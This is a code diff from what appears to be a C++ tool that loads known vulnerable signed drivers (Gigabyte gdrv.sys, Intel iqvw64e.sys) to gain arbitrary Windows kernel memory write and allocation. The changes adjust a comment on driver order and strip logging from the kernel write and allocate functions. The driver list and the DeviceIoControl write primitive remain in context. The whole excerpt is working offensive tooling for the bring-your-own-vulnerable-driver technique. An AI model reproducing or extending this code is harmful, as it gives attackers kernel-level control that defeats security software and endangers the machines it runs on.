@@ -13,7 +13,7 @@ struct DriverInfo {
     const char* description;
 };
 
-// Supported vulnerable drivers (tries in order)
+// Supported vulnerable drivers (tries in order - gdrv first for AMD)
 static DriverInfo g_supportedDrivers[] = {
     {"gdrv", "gdrv.sys", "\\\\.\\GDrv", "Gigabyte - works on AMD/Intel (recommended)"},
     {"iqvw64e", "iqvw64e.sys", "\\\\.\\Nal", "Intel - works on AMD/Intel"},
@@ -195,7 +195,7 @@ bool WriteKernelMemory(UINT64 address, PVOID buffer, SIZE_T size) {
     op.size = size;
 
     DWORD bytesReturned;
-    bool result = DeviceIoControl(
+    return DeviceIoControl(
         g_DriverHandle,
         IOCTL_WRITE_MEMORY,
         &op,
@@ -205,12 +205,6 @@ bool WriteKernelMemory(UINT64 address, PVOID buffer, SIZE_T size) {
         &bytesReturned,
         NULL
     );
-
-    if (result) {
-        LOG_DEBUG("Wrote " << size << " bytes to kernel address 0x" << std::hex << address);
-    }
-
-    return result;
 }
 
 UINT64 AllocateKernelMemory(SIZE_T size) {
@@ -232,7 +226,6 @@ UINT64 AllocateKernelMemory(SIZE_T size) {
         &bytesReturned,
         NULL
     )) {
-        LOG_SUCCESS("Allocated " << size << " bytes in kernel at 0x" << std::hex << op.result);
         return op.result;
     }
 
